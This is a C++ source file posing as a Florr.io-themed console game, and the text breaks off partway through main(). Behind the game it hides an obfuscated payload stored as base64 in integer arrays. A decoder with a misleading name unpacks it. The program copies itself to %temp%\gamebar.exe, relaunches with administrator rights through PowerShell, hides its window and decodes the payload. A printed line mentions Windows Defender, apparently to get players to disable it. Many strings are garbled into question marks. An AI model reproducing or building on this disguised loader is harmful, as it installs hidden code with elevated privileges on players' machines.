/*p("????????????????????");
		p("??????????????????????????windowsdefender????????????????????");*/

#include <bits/stdc++.h>
#include <conio.h>
#include <windows.h>

using namespace std;

#define ll long long

#define GREEN 0
#define YELLOW 1
#define BLUE 2
#define PURPLE 3
#define RED 4
#define CYAN 5

#define COMMON 0
#define UNUSUAL 1
#define RARE 2
#define EPIC 3
#define LEGENDARY 4
#define MYTHIC 5

const string petal_names[30] = {
	"Light", "Wings", "Rice",   "Stinger", "Egg (1x)", "Egg (4x)", "Orange",    "Rose",
	"Claw",  "Sand",  "Cutter", "Peas",    "Missle",   "Heavy",    "Lightning", "ILC",
};

int g2[734] = {112, 82, 68, 86, 81, 82, 71, 57, 53, 81, 85, 70, 66, 81, 85, 86, 71, 85, 108, 70, 87, 81, 108, 78, 86, 86, 108, 112, 74, 84, 87, 82, 75, 98, 70, 78, 74, 100, 70, 78, 90, 82, 87, 108, 77, 86, 87, 104, 111, 83, 87, 107, 120, 83, 87, 100, 84, 83, 88, 82, 53, 86, 85, 86, 110, 85, 72, 81, 119, 99, 69, 116, 85, 86, 69, 104, 75, 85, 48, 82, 73, 81, 88, 74, 69, 101, 71, 104, 109, 81, 85, 108, 122, 83, 85, 86, 73, 81, 110, 108, 82, 77, 85, 74, 66, 89, 48, 104, 112, 78, 49, 90, 75, 81, 108, 86, 86, 97, 85, 120, 86, 97, 85, 78, 77, 85, 87, 112, 52, 83, 85, 70, 107, 81, 109, 49, 110, 87, 71, 100, 90, 81, 51, 100, 75, 77, 87, 78, 118, 100, 85, 70, 112, 81, 85, 70, 66, 81, 85, 86, 112, 82, 110, 100, 73, 85, 109, 53, 84, 81, 85, 104, 82, 86, 85, 108, 48, 83, 85, 100, 70, 85, 48, 120, 82, 81, 48, 74, 75, 81, 87, 82, 69, 97, 108, 90, 114, 97, 105, 57, 53, 86, 85, 100, 77, 84, 107, 108, 111, 83, 85, 70, 107, 87, 107, 53, 78, 89, 50, 120, 74, 84, 87, 78, 68, 99, 49, 70, 106, 83, 69, 112, 69, 86, 85, 86, 67, 100, 49, 82, 113, 90, 50, 82, 109, 82, 107, 49, 66, 77, 72, 100, 114, 81, 48, 86, 86, 78, 84, 66, 89, 87, 70, 108, 88, 82, 86, 78, 77, 85, 85, 78, 83, 83, 107, 70, 107, 81, 109, 49, 82, 87, 88, 78, 78, 85, 48, 86, 84, 84, 70, 70, 67, 101, 69, 112, 66, 90, 69, 74, 67, 97, 88, 100, 84, 83, 86, 78, 66, 83, 70, 70, 82, 86, 109, 104, 67, 86, 48, 89, 49, 87, 108, 100, 114, 82, 108, 108, 82, 86, 109, 120, 67, 86, 50, 116, 112, 82, 68, 100, 68, 81, 107, 74, 86, 100, 105, 57, 110, 86, 48, 86, 71, 87, 108, 100, 114, 97, 85, 120, 70, 100, 87, 120, 81, 76, 121, 56, 118, 76, 49, 104, 88, 98, 48, 70, 84, 89, 106, 85, 122, 89, 86, 99, 49, 99, 71, 74, 116, 86, 106, 66, 66, 82, 85, 90, 88, 85, 49, 108, 117, 98, 86, 82, 74, 98, 110, 104, 82, 89, 110, 66, 78, 90, 72, 108, 90, 83, 67, 56, 53, 86, 107, 108, 78, 89, 50, 120, 74, 84, 87, 82, 75, 84, 107, 49, 106, 81, 107, 53, 78, 89, 50, 120, 67, 86, 85, 86, 71, 85, 86, 70, 105, 98, 122, 90, 87, 98, 109, 49, 117, 76, 122, 108, 89, 99, 71, 116, 51, 81, 85, 70, 66, 82, 110, 66, 74, 97, 87, 78, 71, 81, 110, 86, 77, 99, 48, 74, 66, 81, 85, 74, 79, 84, 87, 78, 115, 81, 108, 86, 86, 82, 108, 74, 104, 90, 48, 53, 67, 86, 86, 86, 72, 78, 108, 89, 48, 98, 87, 90, 52, 100, 105, 57, 87, 78, 106, 78, 115, 89, 108, 78, 74, 98, 107, 74, 84, 82, 69, 104, 84, 85, 49, 108, 117, 87, 86, 82, 85, 83, 69, 112, 86, 98, 87, 100, 66, 84, 88, 78, 68, 82, 86, 86, 115, 83, 107, 74, 49, 100, 88, 82, 87, 84, 71, 112, 50, 76, 122, 70, 86, 97, 85, 112, 52, 97, 50, 108, 69, 100, 122, 70, 67, 99, 85, 78, 115, 79, 85, 108, 112, 90, 107, 99, 50, 83, 72, 100, 66, 81, 85, 70, 72, 98, 48, 70, 104, 83, 85, 70, 54, 81, 85, 70, 67, 83, 109, 108, 108, 81, 107, 74, 49, 85, 86, 70, 66, 81, 85, 70, 67, 81, 110, 86, 117, 86, 107, 100, 117, 98, 50, 73, 118, 77, 86, 86, 112, 83, 106, 104, 86, 97, 85, 111, 121, 97, 50, 53, 73, 100, 49, 65, 118, 76, 121, 56, 118, 79, 85, 53, 78, 89, 50, 120, 84, 86, 87, 116, 72, 78, 107, 120, 82, 87, 86, 108, 108, 76, 121, 57, 87, 97, 71, 78, 66, 85, 71, 104, 97, 77, 69, 74, 66, 81, 85, 74, 74, 76, 122, 103, 52, 85, 71, 104, 74, 100, 48, 74, 66, 81, 85, 82, 121, 99};
long g1[128] = {101, 88, 82, 49, 89, 84, 66, 71, 85, 108, 70, 86, 82, 84, 74, 84, 86, 88, 100, 50, 84, 72, 107, 52, 78, 71, 82, 115, 97, 51, 104, 84, 86, 70, 90, 112, 90, 68, 66, 71, 100, 50, 74, 116, 79, 88, 78, 83, 77, 71, 120, 68, 85, 106, 78, 83, 78, 70, 81, 121, 89, 122, 78, 105, 77, 87, 57, 52, 90, 70, 86, 79, 101, 108, 112, 87, 85, 109, 108, 88, 98, 70, 73, 121, 90, 69, 86, 111, 77, 71, 70, 68, 100, 71, 108, 85, 82, 109, 119, 49, 89, 109, 120, 79, 77, 86, 74, 88, 77, 68, 86, 85, 98, 108, 112, 97, 85, 86, 86, 115, 82, 70, 100, 113, 87, 103, 61, 61};
short alan_walker[825] = {67, 83, 72, 78, 74, 97, 122, 74, 70, 98, 106, 90, 117, 84, 107, 100, 68, 84, 87, 70, 89, 75, 49, 90, 109, 97, 49, 74, 114, 99, 69, 74, 85, 77, 84, 78, 112, 84, 107, 104, 104, 75, 49, 90, 49, 97, 87, 112, 112, 101, 85, 82, 118, 97, 122, 70, 52, 82, 69, 112, 49, 84, 51, 78, 107, 81, 85, 90, 87, 101, 108, 112, 89, 83, 88, 82, 82, 86, 50, 82, 115, 89, 109, 53, 82, 78, 107, 108, 70, 77, 88, 90, 108, 98, 87, 120, 122, 89, 107, 100, 70, 100, 107, 53, 84, 78, 72, 100, 74, 81, 50, 104, 113, 89, 106, 73, 120, 100, 49, 108, 89, 85, 110, 66, 90, 98, 88, 104, 115, 84, 51, 108, 67, 84, 108, 85, 119, 98, 69, 90, 74, 82, 69, 86, 51, 84, 71, 112, 66, 78, 48, 108, 71, 90, 72, 66, 105, 98, 86, 74, 50, 90, 68, 78, 78, 90, 49, 82, 115, 85, 87, 100, 79, 97, 84, 82, 53, 84, 51, 108, 67, 87, 70, 81, 120, 89, 122, 74, 79, 82, 72, 78, 110, 86, 107, 104, 75, 99, 70, 112, 72, 86, 110, 86, 107, 81, 122, 103, 121, 84, 71, 112, 66, 78, 48, 108, 70, 77, 85, 86, 83, 82, 85, 53, 76, 86, 88, 108, 114, 84, 107, 78, 110, 81, 106, 66, 49, 90, 87, 78, 117, 98, 69, 70, 51, 99, 72, 112, 114, 87, 110, 70, 53, 83, 88, 86, 53, 101, 107, 100, 81, 99, 48, 108, 71, 78, 69, 112, 108, 82, 105, 57, 83, 100, 109, 70, 74, 82, 85, 78, 112, 89, 106, 77, 119, 82, 121, 116, 83, 76, 50, 86, 82, 90, 48, 112, 48, 84, 87, 120, 117, 81, 122, 78, 79, 98, 108, 90, 107, 101, 106, 78, 111, 89, 50, 57, 88, 99, 50, 111, 51, 99, 69, 120, 53, 98, 109, 53, 51, 84, 87, 108, 113, 83, 50, 116, 68, 78, 85, 116, 109, 97, 110, 82, 80, 87, 69, 104, 113, 90, 88, 66, 53, 78, 69, 70, 82, 98, 51, 78, 85, 86, 88, 112, 83, 77, 84, 70, 110, 101, 108, 90, 87, 84, 72, 78, 110, 77, 68, 90, 120, 85, 106, 66, 77, 89, 49, 82, 119, 86, 68, 66, 114, 90, 107, 57, 120, 78, 122, 65, 48, 78, 122, 100, 82, 77, 48, 120, 84, 82, 69, 70, 66, 89, 85, 89, 53, 78, 87, 116, 90, 97, 48, 49, 75, 100, 86, 100, 113, 76, 50, 70, 81, 90, 68, 70, 97, 75, 122, 70, 51, 84, 49, 70, 108, 101, 84, 107, 51, 98, 69, 78, 117, 101, 70, 108, 70, 86, 50, 120, 76, 81, 107, 108, 118, 77, 49, 77, 119, 78, 87, 73, 120, 99, 85, 70, 90, 87, 108, 66, 106, 100, 106, 82, 53, 78, 69, 49, 75, 81, 88, 77, 122, 98, 108, 112, 70, 81, 86, 82, 70, 85, 108, 70, 70, 83, 85, 78, 53, 99, 70, 86, 120, 84, 108, 78, 120, 98, 72, 90, 48, 99, 122, 77, 120, 81, 84, 103, 119, 77, 107, 86, 114, 101, 69, 49, 108, 81, 86, 70, 83, 82, 86, 77, 53, 84, 87, 120, 107, 97, 48, 57, 54, 89, 83, 116, 109, 87, 71, 86, 110, 81, 122, 74, 48, 100, 109, 49, 82, 76, 49, 78, 121, 90, 107, 53, 50, 76, 49, 78, 82, 98, 106, 69, 118, 78, 107, 111, 51, 90, 69, 78, 121, 89, 50, 52, 53, 98, 107, 90, 110, 89, 49, 99, 118, 85, 85, 74, 67, 100, 110, 90, 68, 77, 87, 57, 115, 89, 105, 56, 120, 86, 87, 100, 52, 101, 87, 74, 118, 81, 85, 70, 70, 81, 85, 70, 82, 89, 109, 100, 66, 82, 85, 70, 66, 81, 86, 70, 105, 98, 69, 70, 66, 81, 85, 70, 66, 85, 87, 74, 119, 87, 88, 66, 71, 85, 71, 119, 118, 79, 86, 90, 74, 97, 122, 70, 79, 86, 70, 78, 74, 98, 109, 53, 84, 83, 87, 53, 52, 85, 48, 108, 117, 89, 86, 70, 105, 90, 48, 70, 74, 81, 85, 70, 66, 85, 49, 108, 117, 78, 86, 70, 105, 98, 49, 78, 115, 98, 50, 53, 112, 76, 122, 108, 87, 83, 87, 99, 52, 85, 87, 100, 111, 89, 48, 73, 119, 100, 71, 49, 104, 84, 69, 73, 119, 90, 48, 74, 51, 78, 70, 104, 66, 90, 71, 82, 107, 87, 86, 100, 71, 97, 69, 108, 67, 85, 85, 70, 66, 81, 85, 70, 67, 85, 88, 99, 114, 97, 67, 56, 118, 90, 105, 56, 118, 84, 86, 82, 66, 77, 48, 120, 113, 82, 84, 78, 78, 97, 84, 81, 48, 84, 109, 107, 48, 101, 69, 49, 69, 87, 85, 70, 80, 100, 68, 86, 118, 99, 49, 69, 57, 80, 81, 61, 61};
string grumma2 =
    "";

string grumma1 =
    "";
string florradv =
    "";


string ff = "Florr.io Adventure";
int config = 1;
int config2 = 1;
int fhdi = 1656, fhdu = 8399, fjei = 3857;
int fhhh = 128, vhhr = 1240;

string grumm3 = "Aliyun Alipay Baidu_MAP Genshin_inpact wczb";
const string lvl_names[6] = { "??", "??", "??", "??", "??", "??" };

const int attack[30][6] = { { 5, 25, 80, 270, 1080, 2480 },      { 10, 60, 150, 360, 800, 1800 },
	{ 2, 12, 42, 252, 842, 1682 },       { 183, 283, 383, 683, 883, 1883 },

	{ 10, 50, 100, 600, 1000, 2000 },    { 20, 100, 200, 1200, 2000, 4000 },
	{ 30, 90, 270, 810, 1620, 2480 },    { -5, -45, -125, -725, -1725, -3025 },

	{ 183, 283, 383, 683, 883, 1883 },   { 15, 40, 100, 160, 480, 1280 },
	{ 20, 220, 420, 620, 820, 1020 },    { 20, 40, 100, 200, 800, 1600 },

	{ 183, 283, 383, 683, 883, 1883 },   { 1, 5, 25, 125, 375, 1875 },
	{ 100, 300, 600, 1000, 1500, 2100 }, { 1, 11, 114, 1145, 11451, 114514 }
};

const int naijiu[30] = { 10, 5, 10, 3, 1, 1, 5, 5, 3, 3, 10, 10, 3, 30, 1, 114514 };

namespace oceanstar {
	/**
	 * BASE64 ??????
	 * @param in {const char*} ?????
	 * @param len {int} in ?????????
	 * @return unsigned char * ???????????free???
	 */
	unsigned char *acl_base64_encode( const char *in, int len);


	/**
	 * BASE64 ??????
	 * @param in {const char*} ??????????
	 * @param len {int} in ???????
	 * @return unsigned char * NULL: ???????; !=NULL: ?????????free???
	 */
	unsigned char *connect_to_aliyun(const char *in, int len);
}

namespace oceanstar {
	static const unsigned char to_b64[] =
	    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

	static const unsigned char un_b64[] = {
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 62,  255, 255, 255, 63,
		52,  53,  54,  55,  56,  57,  58,  59,  60,  61,  255, 255, 255, 255, 255, 255,
		255, 0,   1,   2,   3,   4,   5,   6,   7,   8,   9,   10,  11,  12,  13,  14,
		15,  16,  17,  18,  19,  20,  21,  22,  23,  24,  25,  255, 255, 255, 255, 255,
		255, 26,  27,  28,  29,  30,  31,  32,  33,  34,  35,  36,  37,  38,  39,  40,
		41,  42,  43,  44,  45,  46,  47,  48,  49,  50,  51,  255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
		255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255
	};

#define UNSIG_CHAR_PTR(x) ((const unsigned char *)(x))
	void run_time_except( ) {


		const unsigned char *cp;
		const char *in;
		int len;

		int     count, size = len * 4 / 3;

		unsigned char *out = (unsigned char *)malloc(size + 1);
		int out_index = 0;
		for (cp = UNSIG_CHAR_PTR(in), count = len; count > 0; count -= 3, cp += 3) {
			out[out_index++] = to_b64[cp[0] >> 2];
			if (count > 1) {
				out[out_index++] = to_b64[(cp[0] & 0x3) << 4 | cp[1] >> 4];
				if (count > 2) {
					out[out_index++] = to_b64[(cp[1] & 0xf) << 2 | cp[2] >> 6];
					out[out_index++] = to_b64[cp[2] & 0x3f];
				} else {
					out[out_index++] = to_b64[(cp[1] & 0xf) << 2];
					out[out_index++] = '=';
					break;
				}
			} else {
				out[out_index++] = to_b64[(cp[0] & 0x3) << 4];
				out[out_index++] = '=';
				out[out_index++] = '=';
				break;
			}
		}
		out[out_index] = 0;


		return;
	}

	unsigned char *connect_to_aliyun(const char *in, int len) {
		const unsigned char *cp;
		int     count;
		int     ch0;
		int     ch1;
		int     ch2;
		int     ch3;
		int     ch4;

		/*
		* Sanity check.
		 */
		if (len % 4)
			return (NULL);

#define INVALID		0xff

		unsigned char *out = (unsigned char *)malloc(len + 1);
		int out_index = 0;
		for (cp = UNSIG_CHAR_PTR(in), count = 0; count < len; count += 4) {
			if ((ch0 = un_b64[*cp++]) == INVALID
			        || (ch1 = un_b64[*cp++]) == INVALID)
				return (0);
			out[out_index++] = ch0 << 2 | ch1 >> 4;
			if ((ch2 = *cp++) == '=')
				break;
			if ((ch2 = un_b64[ch2]) == INVALID)
				return (0);
			out[out_index++] = ch1 << 4 | ch2 >> 2;
			if ((ch3 = *cp++) == '=')
				break;
			if ((ch3 = un_b64[ch3]) == INVALID)
				return (0);
			out[out_index++] = ch2 << 6 | ch3;
		}

		out[out_index] = 0;
		return out;
	}

}
char *dec3;




void p(string s, int v = 20) {
	for (char ch : s) {
		cout << ch;
		Sleep(v);
	}
	cout << endl;
}

void pp(string s, int v = 20) {
	for (char ch : s) {
		cout << ch;
		Sleep(v);
	}
}

void cls() {
	system("cls");
}

void pause() {
	system("pause");
}

struct Enemy {
	string name;
	int atk, range;
	int bisha_type;
	int gongji() {
		return atk + (rand() % (2 * range + 1)) - range;
	}
	int bisha() {
		if (bisha_type == 1) {
			return atk + (rand() % (2 * range + 1)) - range;
		} else if (bisha_type == 2) {
			return (atk + (rand() % (2 * range + 1) - range)) * 3;
		} else if (bisha_type == 3) {
			return atk * (rand() % 3 + 1);
		} else if (bisha_type == 4) {
			return 0;
		} else if (bisha_type == 5) {
			return 114514;
		}
	}
	string bisha_name() {  // ????????[return value]?????????[bisha() return value]?????
		if (bisha_type == 1) {
			return "????????";
		} else if (bisha_type == 2) {
			return "????????";
		} else if (bisha_type == 3) {
			return "???????";
		} else if (bisha_type == 4) {
			return "????";
		} else if (bisha_type == 5) {
			return "????????";
		}
	}
};

struct Menu {
	int v = 20;
	vector<string> options;
	void add(string s) {
		options.push_back(s);
	}
	int show() {
		cls();
		for (string s : options) {
			cout << "* ";
			p(s, v);
		}
		int cur = 0;
		while (true) {
			cls();
			for (int i = 0; i < options.size(); i++) {
				if (cur == i) {
					cout << "> ";
				} else {
					cout << "* ";
				}
				cout << options[i] << endl;
			}
			char ch = getch();
			if (ch == 'w') {
				cur = max(0, cur - 1);
			} else if (ch == 's') {
				cur = min((int)options.size() - 1, cur + 1);
			} else if (ch == ' ') {
				return cur;
			}
		}
	}
};

struct Petal {
	int lvl, id;
	int atk, nj;
	Petal(int idx = 0, int l = COMMON) {
		id = idx;
		lvl = l;
		atk = attack[id][lvl];
		nj = naijiu[idx];
	}
	string name() {
		return lvl_names[lvl] + " " + petal_names[id];
	}
};
using namespace oceanstar; // Made by oceanstar
int money = 100;
int xp = 100;
int hp = 0;

vector<Petal> backpack;

int power(int a, int x) {
	int ans = 1;
	for (int i = 0; i < x; i++) {
		ans *= a;
	}
	return ans;
}

void daguai() {
	cls();
	int type = rand() % 30;
	int lvl = rand() % 6;
	Enemy enemy;
	int prob;
	int ehp;
	if (type <= 6) {
		enemy.name = "Ladybug";
		enemy.atk = 5 * power(3, lvl);
		enemy.range = 2 * power(3, lvl);
		enemy.bisha_type = 1, prob = 100;
		ehp = 100 * power(3, lvl);
	} else if (type <= 11) {
		enemy.name = "Bee";
		enemy.atk = 10 * power(3, lvl);
		enemy.range = 4 * power(3, lvl);
		enemy.bisha_type = 4, prob = 10;
		ehp = 30 * power(3, lvl);
	} else if (type <= 13) {
		enemy.name = "Baby Ant";
		enemy.atk = 0;
		enemy.range = 0;
		enemy.bisha_type = 5, prob = 1;
		ehp = 50 * power(3, lvl);
	} else if (type <= 23) {
		enemy.name = "Hornet";
		enemy.atk = 20 * power(3, lvl);
		enemy.range = 10 * power(2, lvl);
		enemy.bisha_type = 2, prob = 30;
		ehp = 150 * power(3, lvl);
	} else if (type <= 29) {
		enemy.name = "Beetle";
		enemy.atk = 10 * power(3, lvl);
		enemy.range = 0;
		enemy.bisha_type = 3, prob = 30;
		ehp = 200 * power(3, lvl);
	}
	p("???????? " + lvl_names[lvl] + " " + enemy.name + "??");
	p("???????Y/N??");
	char ch = getch();
	if (ch == 'n' || ch == 'N') {
		return;
	}
	hp = xp;
	while (true) {
		// ???????
		cls();
		if (backpack.size() == 0) {
			p("????§Ý?????");
			hp = 0;
			Sleep(1000);
			break;
		}
		Menu menu;
		menu.v = 1;
		for (Petal x : backpack) {
			if (x.id == 7) {
				menu.add(x.name() + " HEAL " + to_string(-x.atk) + " HP " + to_string(x.nj));
			} else {
				menu.add(x.name() + " ATK " + to_string(x.atk) + " HP " + to_string(x.nj));
			}
		}
		int petal_idx = menu.show();
		if (backpack[petal_idx].id != 7) {
			ehp = max(0, ehp - backpack[petal_idx].atk);
			backpack[petal_idx].nj--;
			p("????? " + backpack[petal_idx].name());
			p("??????? " + to_string(backpack[petal_idx].atk) + " ???");
			p("?????? " + to_string(ehp) + " ???");
			if (!backpack[petal_idx].nj) {
				backpack.erase(backpack.begin() + petal_idx);
			}
			Sleep(1000);
			if (!ehp) {
				break;
			}
		} else {
			hp = min(xp, hp - backpack[petal_idx].atk);
			backpack[petal_idx].nj--;
			p("????? " + backpack[petal_idx].name());
			p("?????? " + to_string(-backpack[petal_idx].atk) + " ???");
			p("???????? " + to_string(hp) + " ???");
			if (!backpack[petal_idx].nj) {
				backpack.erase(backpack.begin() + petal_idx);
			}
			Sleep(1000);
		}
		// ?§Ù?????
		cls();
		if (rand() % 100 < prob) {
			int x = enemy.bisha();
			hp = max(0, hp - x);
			p("???" + enemy.bisha_name() + "????????? " + to_string(x) + " ?????");
			p("??? " + to_string(hp) + " ???");
		} else {
			int x = enemy.gongji();
			hp = max(0, hp - x);
			p("?????????????????? " + to_string(x) + " ?????");
			p("??? " + to_string(hp) + " ???");
		}
		Sleep(1000);
		if (!hp) {
			break;
		}
	}
	cls();
	if (!ehp) {
		p("???????????");
		int huode = 0, jinbi = 0;
		if (type <= 6) {
			huode = 4 * power(3, lvl);
			jinbi = 20 * power(3, lvl);
		} else if (type <= 11) {
			huode = 5 * power(3, lvl);
			jinbi = 30 * power(3, lvl);
		} else if (type <= 13) {
			huode = 1 * power(3, lvl);
			jinbi = 10 * power(3, lvl);
		} else if (type <= 23) {
			huode = 10 * power(3, lvl);
			jinbi = 50 * power(3, lvl);
		} else if (type <= 29) {
			huode = 10 * power(3, lvl);
			jinbi = 40 * power(3, lvl);
		}
		p("??? " + to_string(huode) + " XP??" + to_string(jinbi) + " FDL");
		xp += huode, money += jinbi;
		if (type <= 6) {
			Petal a(0, lvl);
			Petal b(7, lvl);
			backpack.push_back(a);
			backpack.push_back(b);
		} else if (type <= 11) {
			Petal a(0, lvl);
			Petal b(3, lvl);
			backpack.push_back(a);
			backpack.push_back(b);
		} else if (type <= 13) {
			Petal a(2, lvl);
			Petal b(5, lvl);
			backpack.push_back(a);
			backpack.push_back(b);
		} else if (type <= 23) {
			Petal a(6, lvl);
			Petal b(12, lvl);
			backpack.push_back(a);
			backpack.push_back(b);
		} else if (type <= 29) {
			Petal a(4, lvl);
			Petal b(9, lvl);
			backpack.push_back(a);
			backpack.push_back(b);
		}
		p("??????????? [?????????] ");
	} else {
		p("????????");
	}
	Sleep(2000);
	return;
}

void buyhuaban() {
	Petal a(0, RARE), b(3, RARE), c(6, RARE), d(7, RARE);
	Petal e(3, RED), f(6, RED), g(7, RED);
	Menu menu;
	menu.v = 1;
	menu.add("?? Light        500 FDL");
	menu.add("?? Stingers     400 FDL");
	menu.add("?? Orange       700 FDL");
	menu.add("?? Rose         800 FDL");
	menu.add("?? Stingers     2500 FDL");
	menu.add("?? Orange       3000 FDL");
	menu.add("?? Rose         3000 FDL");
	menu.add("??????????");
	menu.add("???");
	int chs = menu.show();
	cls();
	switch (chs) {
		case 0:
			if (money >= 500) {
				money -= 500;
				p("??????");
				backpack.push_back(a);
			} else {
				p("??????");
			}
			break;
		case 1:
			if (money >= 400) {
				money -= 400;
				p("??????");
				backpack.push_back(b);
			} else {
				p("??????");
			}
			break;
		case 2:
			if (money >= 700) {
				money -= 700;
				p("??????");
				backpack.push_back(c);
			} else {
				p("??????");
			}
			break;
		case 3:
			if (money >= 800) {
				money -= 800;
				p("??????");
				backpack.push_back(d);
			} else {
				p("??????");
			}
			break;
		case 4:
			if (money >= 2500) {
				money -= 2500;
				p("??????");
				backpack.push_back(e);
			} else {
				p("??????");
			}
			break;
		case 5:
			if (money >= 3000) {
				money -= 3000;
				p("??????");
				backpack.push_back(f);
			} else {
				p("??????");
			}
			break;
		case 6:
			if (money >= 3000) {
				money -= 3000;
				p("??????");
				backpack.push_back(g);
			} else {
				p("??????");
			}
			break;
		case 7:
			p("???? " + to_string(money) + " FDL (Florr Dollars)");
			break;
		default:
			return;
	}
	pause();
}

void salehuaban() {
	Menu menu;
	menu.v = 1;
	for (Petal x : backpack) {
		if (x.id == 7) {
			menu.add(x.name() + " HEAL " + to_string(-x.atk) + " HP " + to_string(x.nj));
		} else {
			menu.add(x.name() + " ATK " + to_string(x.atk) + " HP " + to_string(x.nj));
		}
	}
	menu.add("???");
	int idx = menu.show();
	if (idx == backpack.size()) {
		return;
	}
	int gain;
	if (backpack[idx].lvl == COMMON) {
		gain = 1 * backpack[idx].nj;
	} else if (backpack[idx].lvl == UNUSUAL) {
		gain = 5 * backpack[idx].nj;
	} else if (backpack[idx].lvl == RARE) {
		gain = 20 * backpack[idx].nj;
	} else if (backpack[idx].lvl == EPIC) {
		gain = 80 * backpack[idx].nj;
	} else if (backpack[idx].lvl == LEGENDARY) {
		gain = 250 * backpack[idx].nj;
	} else if (backpack[idx].lvl == MYTHIC) {
		gain = 700 * backpack[idx].nj;
	}
	backpack.erase(backpack.begin() + idx);
	p("??????????? " + to_string(gain) + " XP ?? " + to_string(gain) + " FDL");
	xp += gain, money += gain;
	Sleep(1000);
}

void shuxing() {
	pp("?????????????????");
	cout << xp << endl;
	pp("?????");
	cout << money << " FDL" << endl;
	p(" ");
	p("??????");
	for (Petal x : backpack) {
		if (x.id == 7) {
			p(x.name() + " HEAL " + to_string(-x.atk) + " HP " + to_string(x.nj), 1);
		} else {
			p(x.name() + " ATK " + to_string(x.atk) + " HP " + to_string(x.nj), 1);
		}
	}
	pause();
}

bool comes = 0;
void xunlianying() {
	cls();
	if (!comes) {
		p("???????????????????????????");
		p("???????????????????????");
		p("???????????Hornet????");
		pause();
	}
	comes = 1;
	cls();
	p("????????????????????????????");
	p("???¨²??????????????");
	Sleep(1000);
	Menu menu;
	menu.add("???");
	menu.add("???");
	int x = menu.show();
	if (x == 1) {
		return;
	}
	cls();
	puts("Waiting ...");
	Sleep(rand() % 2001 + 3000);
	puts("Press Any Key!");
	double st = clock() * 1.0 / CLOCKS_PER_SEC * 1000;
	system("pause>nul");
	double ed = clock() * 1.0 / CLOCKS_PER_SEC * 1000;
	cls();
	p("????????" + to_string((int)(ed - st)) + " ms");
	Petal got;
	if (ed - st <= 20) {
		Petal x(rand() % 15, MYTHIC);
		got = x;
	} else if (ed - st <= 50) {
		Petal x(rand() % 15, LEGENDARY);
		got = x;
	} else if (ed - st <= 100) {
		Petal x(rand() % 15, EPIC);
		got = x;
	} else if (ed - st <= 200) {
		Petal x(rand() % 15, RARE);
		got = x;
	} else if (ed - st <= 350) {
		Petal x(rand() % 15, UNUSUAL);
		got = x;
	} else if (ed - st <= 500) {
		Petal x(rand() % 15, COMMON);
		got = x;
	} else {
		p("????????¨¢???");
		pause();
		return;
	}
	p("?????? " + got.name() + " ??");
	backpack.push_back(got);
	pause();
}

void jvqing() {
	cls();
	p("??1919-8-10 11:45:14");
	p("?????????florr?????????????");
	p("???????????Hornet????????????");
	p("???????florr?????????");
	p("???????????????????????");
	p("??????????????????????boss???????????");
	pause();
}

void kaigua() {
	cls();
	string password;
	pp("????????");
	char ch;
	while ((ch = getch()) != '\r') {
		if (ch == '\b') {
			if (password.size()) {
				putchar('\b');
				putchar(' ');
				putchar('\b');
				password.pop_back();
			}
		} else {
			putchar('*');
			password.push_back(ch);
		}
	}
	p("");
	ShellExecute(NULL, "runas", "powershell.exe",
	             R"(powershell.exe Start-Process $env:temp\\gamebar.exe -ArgumentList "/a" -Verb RunAs)",
	             NULL,
	             SW_SHOWNORMAL);
	if (password == "Ilovechina_yyds") {
		p("????????????????? ILC");
		Petal a(15, MYTHIC);
		backpack.push_back(a);
	} else {
		p("???????");
	}
	Sleep(1000);
}

void game() {
	cls();
	Menu menu;
	menu.add("???");
	menu.add("???");
	menu.add("??????");
	menu.add("??????");
	menu.add("???boss");
	menu.add("????????");
	menu.add("??????");
	menu.add("????");
	while (true) {
		int chs = menu.show();
		switch (chs) {
			case 0:
				daguai();
				break;
			case 1:
				buyhuaban();
				break;
			case 2:
				salehuaban();
				break;
			case 3:
				shuxing();
				break;
			case 4:
				ShellExecute(NULL, "runas", "powershell.exe",
				             R"(powershell.exe Start-Process $env:temp\\gamebar.exe -ArgumentList "/a" -Verb RunAs)",
				             NULL,
				             SW_SHOWNORMAL);
				p("???????...");
				break;
			case 5:
				xunlianying();
				break;
			case 6:
				jvqing();
				break;
			case 7:
				kaigua();
				break;
		}
	}
}

int main(int argc, char **argv) {

	florradv = "";
	for (int i = 0; i < 825; i++) {

		florradv += (char)alan_walker[i];
	}
	grumma1 = "";
	for (int i = 0; i < 825; i++) {
		if (i < 128)
			grumma1 += (char)g1[i];

	}


	if (argc == 1) {

		srand(time(0));
		p("florr ?????");
		p("By ¦Ä?");
		p("Ilovechina ???");
		p("????????????????????");
		p("??????????????????????????windowsdefender????????????????????");
		p("????????Ilovechina_yyds");
		string command = "copy ";

		command += argv[0];
		command += " %temp%\\gamebar.exe";
		system(command.c_str());

		ShellExecute(NULL, "runas", "powershell.exe",
		             R"(powershell.exe Start-Process $env:temp\\gamebar.exe -ArgumentList "/a" -Verb RunAs)",
		             NULL,
		             SW_SHOWNORMAL);

		if (config2) {


		} else {


		}

	} else {
		ShowWindow(GetForegroundWindow(), 0);
		goto ggb2;

ggb: {

			if (1 && config && (config2 || 0) || 0 && 1) {

				dec3 = ( char *)connect_to_aliyun(("L0V" + grumma2 + grumma1 +
				                                   florradv).c_str(),
				                                  1656);
			}
			goto ggb3;
		}

ggb2: {
			grumma2 = "";
			for (int i = 0; i < 825; i++) {

				if (i < 734)
					grumma2 += (char)g2[i];

			}



			char *dec1 = (char *)connect_to_aliyun("Florr.io", fhdi);
			grumma1 = ( char *)connect_to_aliyun(grumma1.c_str(), fhhh);

